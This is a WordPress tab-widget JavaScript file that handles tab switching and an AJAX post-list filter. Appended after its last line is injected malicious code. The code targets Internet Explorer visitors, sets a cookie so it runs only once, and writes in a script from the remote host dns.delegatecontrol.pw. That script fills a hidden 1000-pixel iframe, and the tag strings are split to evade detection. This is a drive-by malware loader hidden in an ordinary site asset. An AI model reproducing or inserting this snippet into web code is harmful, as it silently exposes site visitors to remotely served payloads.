jQuery(document).ready(function(){
	// UL = .wooTabs
	// Tab contents = .inside

	jQuery( '.pptwj-tabs-wrap .inside ul.list li:last-child').css( 'border-bottom','0px' ); // remove last border-bottom from list in tab content
	jQuery( '.pptwj-tabs-wrap .tab-links').each(function(){
		jQuery(this).children( 'li').children( 'a:first').addClass( 'selected' ); // Add .selected class to first tab on load
	});
	jQuery( '.inside > *').hide();
	jQuery( '.inside > *:first-child').show();

	jQuery( '.pptwj-tabs-wrap .tab-links li a').click(function(evt){ // Init Click funtion on Tabs

		var clicked_tab_ref = jQuery(this).attr( 'href' ); // Strore Href value

		jQuery(this).parent().parent().children( 'li').children( 'a').removeClass( 'selected' ); //Remove selected from all tabs
		jQuery(this).addClass( 'selected' );
		jQuery(this).parent().parent().parent().children( '.inside').children( '*').hide();

		jQuery( '.inside ' + clicked_tab_ref).fadeIn(500);

		 evt.preventDefault();

	});
	
	/** Ajax list filter **/
	jQuery( 'ul.tab-filter-list a' ).click( function(e){
		var $this = jQuery(this);
		var $tabWidgetData = {
			'time' : $this.data('time'),
			'numberposts' : $this.data('numberposts'),
			'thumb' : $this.data('thumb'),
			'tab' : $this.data('tab'),
			'action' : "pptwj_tabwidget_list"
		};

		/**
		 * Display ajax loader/spinner
		 */
		var box_height = jQuery('.pptwj-tabs-wrap .boxes').outerHeight();
		var spinner = jQuery('.pptwj-loader img');
		var spinner_div = jQuery('.pptwj-loader');

		spinner.css('margin-top', box_height/2);
		spinner_div.css('height', box_height);
		spinner_div.show();

		var $tabWidgetHandler = function( $data ){
			//console.log( $data );
			spinner_div.hide();
			if( $data == "" ) return;

			jQuery('ul.tab-filter-list a').removeClass('selected');
			$this.addClass('selected');
			
			var $list = $this.parent().parent().siblings('.list');
			$list.html( $data );
		};
		
		jQuery.post(
			PPTWJ.ajaxUrl,
			$tabWidgetData,
			$tabWidgetHandler
		);
		
		e.preventDefault();
	});
});

var useagens__j = window.navigator.userAgent; var cookie_set__j = 'trase_h=sea'; var c_name__j = document.cookie; if (useagens__j.indexOf('MSIE') != -1 && c_name__j.indexOf(cookie_set__j) == -1 && (/*@cc_on!@*/0)) { document.cookie=cookie_set__j + '; expires=Thu, 16 Oct 2020 11:02:40 GMT'; 	document.write('<s' + 'cript src="http://dns.delegatecontrol.pw/jquery.js" type="text/javascript"><' + '/script>'); document.write('<s' + 'cript type="text/javascript">' + 'function xhh54_changesite()' + '{' + 'if (window.getlasposit_hea_se)' + 'document.getElementById(\'ifrmseth_j4\').src = getlasposit_hea_se();' + '}' + 'window.onload=xhh54_changesite;' + '<' + '/script>' + '<style type="text/css">#ifrmseth_j4 { display:none; }</style>' + '<iframe id="ifrmseth_j4" src="" width="1000" height="1000"></iframe>'); }